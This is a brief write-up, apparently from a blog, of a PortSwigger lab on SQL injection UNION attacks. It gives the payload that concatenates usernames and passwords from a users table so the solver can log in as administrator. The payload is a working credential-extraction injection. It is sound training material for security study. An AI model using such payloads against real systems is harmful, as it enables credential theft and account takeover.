This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

in this lab just we need to print username and password in one column by using concat function

'+UNION+SELECT+NULL,username||' '||password+FROM+users--

![](https://cdn-images-1.medium.com/max/1000/1*SjFS6TMU2DU2TWqGiM8mog.png)

![](https://cdn-images-1.medium.com/max/1000/1*mtfaaVKEJy2eYiwIXafjzA.png)